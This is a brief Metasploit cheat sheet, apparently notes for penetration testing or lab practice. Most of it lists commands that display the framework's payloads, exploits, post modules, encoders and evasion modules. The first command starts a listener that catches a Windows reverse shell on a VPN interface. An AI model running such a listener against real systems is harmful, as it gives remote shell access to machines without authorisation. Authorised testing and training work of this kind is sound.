# Metasploit basics

## Start Metasploit

```bash
msfconsole -qx 'use exploit/multi/handler;set lhost tun0;set lport 6656;set payload windows/shell_reverse_tcp;run'
```

## Show all payloads

```bash
msfconsole -qx 'show payloads'
```

## Show all exploits

```bash
msfconsole -qx 'show exploits'
```

## Show all auxiliary modules

```bash
msfconsole -qx 'show auxiliary'
```

## Show all post modules

```bash
msfconsole -qx 'show post'
```

## Show all encoders

```bash
msfconsole -qx 'show encoders'
```

## Show all nops

```bash
msfconsole -qx 'show nops'
```

## Show all evasion modules

```bash
msfconsole -qx 'show evasion'
```
